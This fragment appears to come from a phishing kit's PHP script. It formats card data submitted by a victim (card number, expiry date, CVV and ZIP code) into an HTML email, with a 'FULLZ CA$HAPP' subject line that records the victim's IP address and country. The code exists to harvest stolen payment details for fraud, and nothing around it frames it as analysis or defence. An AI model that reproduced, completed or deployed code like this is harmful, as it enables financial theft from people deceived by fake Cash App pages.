...
<br>
<font style="color:#9c0000;"></font> [CARD NUMBER] = <font >'.$_POST['pan'].'</font>
<br>
<font style="color:#9c0000;"></font> [EXP DATE] = <font >'.$_POST['expiration'].'</font>
<br>
<font style="color:#9c0000;"></font> [CVV] = <font >'.$_POST['securityCode'].'</font>
<br>
<font style="color:#9c0000;"></font> [ZIP] = <font >'.$_POST['postalCode'].'</font>
<br>
<font>[System]</font> <br>
...
$subject  = "✅ FULLZ CA💲HAPP [".$_SERVER['REMOTE_ADDR']." | ".$_SESSION['country1']." ] 💘 "; 
